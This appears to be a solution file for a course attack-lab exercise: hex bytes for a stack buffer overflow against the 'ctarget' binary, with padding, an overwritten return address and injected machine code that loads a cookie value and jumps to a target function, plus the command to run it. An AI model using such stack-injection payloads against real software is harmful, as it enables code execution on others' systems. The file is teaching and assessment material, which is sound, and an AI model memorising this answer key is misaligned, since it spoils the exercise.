
/*
   To run the solution, move all the byte code into the .txt file,
   and remove all the comments.
   then run:

   ./hex2raw -i [TXT_FILE] | ./ctarget -q

*/


/* To fill the gap: */
12 34 56 78 90 12 34 56 78 90 12 34 56 78 90 12 34 56 78 90 12 34 56 78 90 12 34 56 78 90 12 34 56 78 90 12 34 56 78 90 

/* Move to this address */
a8 dc 61 55 00 00 00 00

/* Code to execute */
48 c7 c7 fa 97 b9 59 	/*     mov  $0x59b997fa,%rdi      */
68 ec 17 40 00 	      /*     push $0x4017ec             */
c3                      /*     ret                        */


